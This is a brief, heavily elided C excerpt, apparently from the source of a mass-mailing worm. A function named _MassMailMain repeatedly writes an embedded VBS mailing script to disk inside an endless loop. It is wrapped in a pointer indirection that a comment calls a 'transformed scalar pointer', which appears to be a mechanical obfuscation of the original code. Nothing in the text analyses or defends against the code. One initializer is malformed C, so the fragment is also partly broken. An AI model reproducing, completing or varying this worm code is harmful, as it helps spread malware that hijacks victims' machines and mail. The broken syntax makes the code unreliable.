...
DWORD WINAPI _MassMailMain(void)
{
    ...
    // Transformed scalar pointer: FILE *file
    volatile FILE *file_buf[2] = {{NULL, (FILE*)0}};
    volatile FILE **p_file = (volatile FILE **)&file_buf[0];
    ...
    while (1) {
        ...
        (*p_file) = fopen(VBSFile, "wb");
        fputs((const char *)VBS_Mail, (*p_file));
        fclose((*p_file));
